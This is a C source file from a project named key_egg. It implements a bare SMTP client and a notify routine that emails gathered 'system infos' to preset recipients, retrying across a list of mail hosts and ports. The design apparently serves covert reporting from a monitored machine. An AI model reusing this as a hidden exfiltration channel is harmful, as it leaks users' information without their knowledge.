/*
 * MIT License
 *
 * Copyright (c) 2009 Alexandru Dreptu
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
S: 220 smtp.example.com ESMTP Postfix
C: HELO relay.example.org
S: 250 Hello relay.example.org, I am glad to meet you
C: MAIL FROM:<bob@example.org>
S: 250 Ok
C: RCPT TO:<alice@example.com>
S: 250 Ok
C: RCPT TO:<theboss@example.com>
S: 250 Ok
C: DATA
S: 354 End data with <CR><LF>.<CR><LF>
C: From: "Bob Example" <bob@example.org>
C: To: Alice Example <alice@example.com>
C: Cc: theboss@example.com
C: Date: Tue, 15 Jan 2008 16:02:43 -0500
C: Subject: Test message
C:
C: Hello Alice.
C: This is a test message with 5 header fields and 4 lines in the message body.
C: Your friend,
C: Bob
C: .
S: 250 Ok: queued as 12345
C: QUIT
S: 221 Bye
{The server closes the connection}


 211 System status, or system help reply
 214 Help message
    [Information on how to use the receiver or the meaning of a
    particular non-standard command; this reply is useful only
    to the human user]
 220 <domain> Service ready
 221 <domain> Service closing transmission channel
 250 Requested mail action okay, completed
 251 User not local; will forward to <forward-path>

 354 Start mail input; end with <CRLF>.<CRLF>

 421 <domain> Service not available,
     closing transmission channel
    [This may be a reply to any command if the service knows it
    must shut down]
 450 Requested mail action not taken: mailbox unavailable
    [E.g., mailbox busy]
 451 Requested action aborted: local error in processing
 452 Requested action not taken: insufficient system storage

 500 Syntax error, command unrecognized
    [This may include errors such as command line too long]
 501 Syntax error in parameters or arguments
 502 Command not implemented
 503 Bad sequence of commands
 504 Command parameter not implemented
 550 Requested action not taken: mailbox unavailable
    [E.g., mailbox not found, no access]
 551 User not local; please try <forward-path>
 552 Requested mail action aborted: exceeded storage allocation
 553 Requested action not taken: mailbox name not allowed
    [E.g., mailbox syntax incorrect]
 554 Transaction failed
*/

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include "key_egg.h"
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/un.h>
#include <unistd.h>

#ifdef _SENDMAIL

#define _MAIL_
#include "key_egg_conf.h"

// smtp_write() - write formated messages to smtp server, return false if error
static bool smtp_write(int sock_fd, const char *fmt, ...) {
    va_list ap;
    char buff[1024];
    int r;

    va_start(ap, fmt);
    r = vsnprintf(buff, sizeof(buff), fmt, ap);
    va_end(ap);
    if (r == -1) {
#ifdef DEBUG
        perror("mail.c vsnprintf()");
#endif
        return false;
    }

    if (write(sock_fd, buff, strlen(buff)) != strlen(buff)) {
#ifdef DEBUG
        perror("mail.c write()");
#endif
        return false;
    }
#ifdef DEBUG
    fprintf(stderr, "mail.c write()\n%s\n", buff);
#endif
    return true;
}

/**
 * smtp_read() - read answer from smtp server
 * and return server's reply code or -1 if error
 */
static int smtp_read(int sock_fd) {
    char buff[1024];
    int x = read(sock_fd, buff, sizeof(buff));
    if (x == -1) {
#ifdef DEBUG
        perror("smtp_read()");
#endif
        return -1;
    }
#ifdef DEBUG
    fwrite(buff, 1, x, stderr);
#endif
    return atoi(strtok(buff, " "));
}

bool ke_send_mail(const char *hostname, unsigned short port, const char *from,
                  const char **rcpts, const char *subject, const char *body) {
    int sock_fd = -1, flags_old, flags, ret_val = false;
    char *ip, local_hostname[128] = "cstrike";
    struct sockaddr_in to_addr;
    struct hostent *phe;
    struct timeval timeout;
    fd_set set;

    // get local hostname
    if (gethostname(local_hostname, sizeof(local_hostname)) == -1)
#ifdef DEBUG
        perror("gethostname() failed");
#else
        ;
#endif

    // resolve hosname to ip address
    phe = gethostbyname(hostname);
    if (!phe) {
#ifdef DEBUG
        fprintf(stderr, "gethostbyname(%s) failed : %s\n", hostname,
                strerror(h_errno));
#endif
        goto cleanup;
    }

    // create a TCP socket
    sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock_fd == -1) {
#ifdef DEBUG
        perror("mail.c socket() failed");
#endif
        goto cleanup;
    }

    // set up connection data
    memset(&to_addr, 0, sizeof(to_addr));
    ip = inet_ntoa(*((struct in_addr *)phe->h_addr_list[0]));
    to_addr.sin_family = AF_INET;
    to_addr.sin_addr.s_addr = inet_addr(ip);
    to_addr.sin_port = htons(port);

    // set non-blocking mode for socket
    flags_old = fcntl(sock_fd, F_GETFL, 0);
    flags = flags_old;
    flags |= O_NONBLOCK;
    if (fcntl(sock_fd, F_SETFL, flags) == -1)
#ifdef DEBUG
        perror("mail.c fcntl() no-blocking");
#else
        ;
#endif

    // connect to server
    connect(sock_fd, (const struct sockaddr *)&to_addr,
            sizeof(struct sockaddr));
    if (errno != EINPROGRESS) {
#ifdef DEBUG
        fprintf(stderr, "mail.c connect(%s:%u): %s\n", hostname, port,
                strerror(errno));
#endif
        goto cleanup;
    }

    // setting socket to blocking again, this is probably a bad way
    if (fcntl(sock_fd, F_SETFL, flags_old) == -1)
#ifdef DEBUG
        perror("mail.c fcntl() blocking");
#else
        ;
#endif

    // setting timeout
    FD_ZERO(&set);
    FD_SET(sock_fd, &set);
    timeout.tv_sec = TIMEOUT;
    timeout.tv_usec = 0;
    switch (select(sock_fd + 1, &set, &set, NULL, &timeout)) {
    case -1:
#ifdef DEBUG
        perror("mail.c select() has failed");
#endif
        goto cleanup;
        break;

    case 0:
#ifdef DEBUG
        fputs("connect() timedout\n", stderr);
#endif
        goto cleanup;

    default:
        if (!FD_ISSET(sock_fd, &set)) {
#ifdef DEBUG
            perror("mail.c FD_ISSET() has failed");
#endif
            goto cleanup;
        }
        break;
    }

    // begin smtp protocol (TRY TO SEND AN E-MAIL)
    if (smtp_read(sock_fd) != 220) goto cleanup;

    smtp_write(sock_fd, "HELO %s\r\n", local_hostname);
    if (smtp_read(sock_fd) != 250) goto cleanup;

    smtp_write(sock_fd, "MAIL FROM:<%s>\r\n", from);
    if (smtp_read(sock_fd) != 250) goto cleanup;

    // send to multiple recipients
    while (*rcpts) {
        smtp_write(sock_fd, "RCPT TO:<%s>\n", *(rcpts++));
        if (smtp_read(sock_fd) != 250) goto cleanup;
    }

    smtp_write(sock_fd, "DATA\r\n");
    if (smtp_read(sock_fd) != 354) goto cleanup;

    // send body
    smtp_write(sock_fd,
               "From: <%s>\r\n"
               "Subject: %s\r\n"
               "\r\n"
               "%s\r\n"
               "\r\n.\r\n",
               from, subject, body);
    if (smtp_read(sock_fd) != 250)
        goto cleanup;
    else
        smtp_write(sock_fd, "QUIT\r\n");

    ret_val = true;

cleanup:
    if (sock_fd) {
        shutdown(sock_fd, SHUT_RDWR);
        close(sock_fd);
    }

        // if (phe) freehostent(phe); // not working?
#ifdef DEBUG
    if (!ret_val)
        fprintf(stderr, "Failed to send mail to: (%s:%d)\n", hostname, port);
    else
        fprintf(stderr, "Mail sent to: (%s:%u)\n", hostname, port);
#endif
    return ret_val;
}

/*
 * Check all the smtp servers on each defined port,
 * until e-mail is sent out successfully.
 *
 * char *info is the e-mail body, in our case system infos
 */
void ke_mail_notify(char *info) {
    const char **host_list;
    const unsigned short *port_list;
    char subject[1024], *cptr1, *cptr2;

    // prepare subject
    cptr1 = subject;
    cptr2 = info;
    while (*cptr2 != '\n' && *cptr2 != '\0') {
        *cptr1 = *cptr2;
        cptr1++;
        cptr2++;
    }
    *cptr1 = '\0';

    for (host_list = mail_host_list; *host_list; host_list++)
        for (port_list = mail_port_list; *port_list; port_list++)
            if (ke_send_mail(*host_list, *port_list, SENDER, mail_rcpts,
                             subject, info))
                return;
}

#endif // #ifdef _SENDMAIL
